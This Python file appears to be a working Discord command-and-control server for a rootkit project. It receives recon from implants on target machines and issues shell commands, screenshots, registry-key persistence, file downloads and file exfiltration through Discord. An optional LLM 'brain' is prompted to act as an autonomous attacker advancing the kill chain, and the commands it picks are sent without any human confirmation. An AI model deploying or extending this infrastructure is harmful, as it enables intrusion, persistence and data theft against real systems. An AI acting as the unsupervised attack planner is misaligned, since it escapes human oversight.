"""
discord_c2.py — Discord C2 Controller + AI Brain
22DIV / george wu
Classification: UNCLASSIFIED // ACADEMIC USE ONLY

Discord bot that acts as C2 controller. Sits in a private channel,
receives recon/output from implants via webhook, sends commands back.
Optional AI brain (Ollama or Kimi) to autonomously decide next steps.

Usage:
    python agent/discord_c2.py                    (manual mode)
    python agent/discord_c2.py --brain ollama     (AI autopilot via Ollama)
    python agent/discord_c2.py --brain kimi       (AI autopilot via Kimi)

Env vars (in cheyanne-rootkit/.env or export):
    DISCORD_BOT_TOKEN    — bot token (reuse mrrobot's or create new)
    DISCORD_C2_CHANNEL   — channel ID for C2 comms
    OLLAMA_HOST          — Ollama endpoint (default http://localhost:11434)
    KIMI_API_KEY         — Kimi API key (optional, for --brain kimi)
"""

import os
import sys
import json
import asyncio
import subprocess
import argparse
from datetime import datetime, timezone

try:
    import discord
except ImportError:
    print("[!] discord.py not installed. Run: pip install discord.py")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("[!] requests not installed. Run: pip install requests")
    sys.exit(1)

VADER_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# load .env from cheyanne-rootkit root
def load_env():
    env_path = os.path.join(VADER_ROOT, ".env")
    if os.path.isfile(env_path):
        with open(env_path, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                os.environ.setdefault(k.strip(), v.strip())


# ── AI BRAIN ──

class Brain:
    def __init__(self, provider="none"):
        self.provider = provider
        self.history = []
        self.system_prompt = """You are CHEYANNE Brain — an autonomous penetration testing AI.
You control implants on target machines through a Discord C2 channel.

When you receive recon data from a target, analyze it and decide:
1. What information do you need next? (issue recon commands)
2. What attack vectors are available? (based on installed software, privileges, etc.)
3. What's the next step in the kill chain?

Available commands you can issue (the implant executes them):
- Any shell command (dir, whoami, ipconfig, net user, etc.)
- SCREENSHOT (captures target screen)
- PERSIST (installs registry run key persistence)
- DOWNLOAD <url> <path> (download file to target)
- UPLOAD <path> (exfil file from target via Discord)
- EXIT (kill implant)

Respond with ONLY the next command to run. One command at a time.
If you need to think, prefix with THINK: then give the command on the next line.
Format: CMD: <command>"""

    def think(self, session_id, message_type, data):
        if self.provider == "none":
            return None

        self.history.append({
            "role": "user",
            "content": f"[{message_type}] Session {session_id}:\n{data}"
        })

        if self.provider == "ollama":
            return self._ollama_think()
        elif self.provider == "kimi":
            return self._kimi_think()
        return None

    def _ollama_think(self):
        host = os.environ.get("OLLAMA_HOST", "http://localhost:11434")
        try:
            resp = requests.post(f"{host}/api/chat", json={
                "model": os.environ.get("OLLAMA_MODEL", "qwen3:8b"),
                "messages": [
                    {"role": "system", "content": self.system_prompt},
                    *self.history[-20:]
                ],
                "stream": False,
                "options": {"temperature": 0.3}
            }, timeout=60)
            resp.raise_for_status()
            reply = resp.json()["message"]["content"]
            self.history.append({"role": "assistant", "content": reply})
            return reply
        except Exception as e:
            return f"[BRAIN ERROR] Ollama: {e}"

    def _kimi_think(self):
        api_key = os.environ.get("KIMI_API_KEY", "")
        if not api_key:
            return "[BRAIN ERROR] KIMI_API_KEY not set"
        try:
            resp = requests.post("https://api.moonshot.ai/v1/chat/completions", json={
                "model": "kimi-k2.5",
                "messages": [
                    {"role": "system", "content": self.system_prompt},
                    *self.history[-20:]
                ],
                "temperature": 0.3,
                "max_tokens": 500
            }, headers={
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json"
            }, timeout=60)
            resp.raise_for_status()
            reply = resp.json()["choices"][0]["message"]["content"]
            self.history.append({"role": "assistant", "content": reply})
            return reply
        except Exception as e:
            return f"[BRAIN ERROR] Kimi: {e}"


# ── SESSION TRACKER ──

class Session:
    def __init__(self, session_id, hostname, data):
        self.id = session_id
        self.hostname = hostname
        self.first_seen = datetime.now(timezone.utc)
        self.last_seen = self.first_seen
        self.recon = data
        self.log = []

    def record(self, direction, content):
        entry = {
            "time": datetime.now(timezone.utc).isoformat(),
            "dir": direction,
            "content": content[:2000]
        }
        self.log.append(entry)
        self.last_seen = datetime.now(timezone.utc)


# ── C2 BOT ──

class VaderC2(discord.Client):
    def __init__(self, brain, c2_channel_id, **kwargs):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(intents=intents, **kwargs)
        self.brain = brain
        self.c2_channel_id = int(c2_channel_id)
        self.sessions = {}
        self.log_file = os.path.join(VADER_ROOT, "agent",
            f"c2_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

    async def on_ready(self):
        self.log(f"C2 ONLINE — {self.user} — brain={self.brain.provider}")
        self.log(f"Monitoring channel {self.c2_channel_id}")
        channel = self.get_channel(self.c2_channel_id)
        if channel:
            await channel.send(f"```\n☠ CHEYANNE C2 ONLINE — brain={self.brain.provider}\n"
                               f"  Waiting for implant callbacks...\n```")

    async def on_message(self, message):
        if message.channel.id != self.c2_channel_id:
            return
        if message.author == self.user:
            return

        content = message.content.strip()

        # check for implant messages (JSON format)
        if content.startswith("{"):
            try:
                data = json.loads(content)
                await self.handle_implant_message(data)
                return
            except json.JSONDecodeError:
                pass

        # check for code block wrapped JSON
        if content.startswith("```") and "{" in content:
            try:
                json_str = content.split("```")[1]
                if json_str.startswith("json"):
                    json_str = json_str[4:]
                data = json.loads(json_str.strip())
                await self.handle_implant_message(data)
                return
            except (json.JSONDecodeError, IndexError):
                pass

        # manual operator commands
        if content.startswith("!"):
            await self.handle_operator_command(content, message)

    async def handle_implant_message(self, data):
        msg_type = data.get("type", "unknown")
        session_id = data.get("session", "unknown")
        hostname = data.get("hostname", "unknown")

        if msg_type == "recon":
            recon_data = data.get("data", "")
            self.sessions[session_id] = Session(session_id, hostname, recon_data)
            self.log(f"NEW SESSION: {session_id} @ {hostname}")

            channel = self.get_channel(self.c2_channel_id)
            await channel.send(f"```diff\n+ NEW IMPLANT: {hostname}\n"
                               f"+ Session: {session_id}\n"
                               f"+ Recon: {len(recon_data)} bytes\n```")

            # if brain is active, let it decide
            if self.brain.provider != "none":
                self.log(f"BRAIN thinking about {session_id}...")
                reply = self.brain.think(session_id, "RECON", recon_data)
                if reply:
                    await channel.send(f"```\n🧠 BRAIN:\n{reply}\n```")
                    cmd = self.extract_command(reply)
                    if cmd:
                        await self.send_command(session_id, cmd)

        elif msg_type == "output":
            output = data.get("data", "")
            if session_id in self.sessions:
                self.sessions[session_id].record("in", output)
            self.log(f"OUTPUT [{session_id}]: {output[:200]}")

            channel = self.get_channel(self.c2_channel_id)
            # truncate for Discord (2000 char limit)
            display = output[:1800] if len(output) > 1800 else output
            await channel.send(f"```\n[{session_id}] OUTPUT:\n{display}\n```")

            if self.brain.provider != "none":
                reply = self.brain.think(session_id, "OUTPUT", output)
                if reply:
                    await channel.send(f"```\n🧠 BRAIN:\n{reply}\n```")
                    cmd = self.extract_command(reply)
                    if cmd:
                        await self.send_command(session_id, cmd)

        elif msg_type == "heartbeat":
            if session_id in self.sessions:
                self.sessions[session_id].last_seen = datetime.now(timezone.utc)

    async def handle_operator_command(self, content, message):
        parts = content.split(maxsplit=2)
        cmd = parts[0].lower()
        channel = self.get_channel(self.c2_channel_id)

        if cmd == "!sessions":
            if not self.sessions:
                await channel.send("```\nNo active sessions.\n```")
                return
            lines = []
            for sid, s in self.sessions.items():
                lines.append(f"  {sid} | {s.hostname} | seen {s.last_seen.strftime('%H:%M:%S')}")
            await channel.send(f"```\nACTIVE SESSIONS:\n" + "\n".join(lines) + "\n```")

        elif cmd == "!cmd" and len(parts) >= 3:
            session_id = parts[1]
            command = parts[2]
            await self.send_command(session_id, command)

        elif cmd == "!brain":
            mode = parts[1] if len(parts) > 1 else "status"
            if mode in ("ollama", "kimi", "none"):
                self.brain = Brain(mode)
                await channel.send(f"```\nBrain switched to: {mode}\n```")
            else:
                await channel.send(f"```\nBrain: {self.brain.provider}\n```")

        elif cmd == "!help":
            await channel.send("```\n"
                "CHEYANNE C2 — Operator Commands:\n"
                "  !sessions              — list active sessions\n"
                "  !cmd <session> <cmd>   — send command to implant\n"
                "  !brain <ollama|kimi|none> — switch AI brain\n"
                "  !log <session>         — show session log\n"
                "  !help                  — this\n"
                "```")

        elif cmd == "!log" and len(parts) >= 2:
            session_id = parts[1]
            if session_id in self.sessions:
                log = self.sessions[session_id].log[-10:]
                lines = [f"  [{e['dir']}] {e['time']}: {e['content'][:100]}" for e in log]
                await channel.send(f"```\nLOG {session_id}:\n" + "\n".join(lines) + "\n```")

    async def send_command(self, session_id, command):
        channel = self.get_channel(self.c2_channel_id)
        cmd_msg = json.dumps({
            "type": "cmd",
            "session": session_id,
            "command": command
        })
        await channel.send(cmd_msg)
        if session_id in self.sessions:
            self.sessions[session_id].record("out", command)
        self.log(f"CMD [{session_id}]: {command}")

    def extract_command(self, brain_reply):
        for line in brain_reply.split("\n"):
            line = line.strip()
            if line.startswith("CMD:"):
                return line[4:].strip()
        return None

    def log(self, msg):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {msg}"
        print(f"  {entry}")
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(entry + "\n")
        except Exception:
            pass


# ── MAIN ──

def main():
    parser = argparse.ArgumentParser(description="CHEYANNE Discord C2")
    parser.add_argument("--brain", choices=["none", "ollama", "kimi"],
                        default="none", help="AI brain provider")
    args = parser.parse_args()

    load_env()

    token = os.environ.get("DISCORD_BOT_TOKEN", "")
    channel_id = os.environ.get("DISCORD_C2_CHANNEL", "")

    if not token:
        print("  [!] DISCORD_BOT_TOKEN not set in .env")
        sys.exit(1)
    if not channel_id:
        print("  [!] DISCORD_C2_CHANNEL not set in .env")
        sys.exit(1)

    brain = Brain(args.brain)

    print()
    print("  +======================================================+")
    print("  |  CHEYANNE DISCORD C2 — 22DIV / george wu             |")
    print("  |  Callsign: PALPATINE                                 |")
    print("  +======================================================+")
    print(f"  |  Brain:    {args.brain:<43}|")
    print(f"  |  Channel:  {channel_id:<43}|")
    print("  +======================================================+")
    print()

    bot = VaderC2(brain, channel_id)
    bot.run(token)


if __name__ == "__main__":
    main()
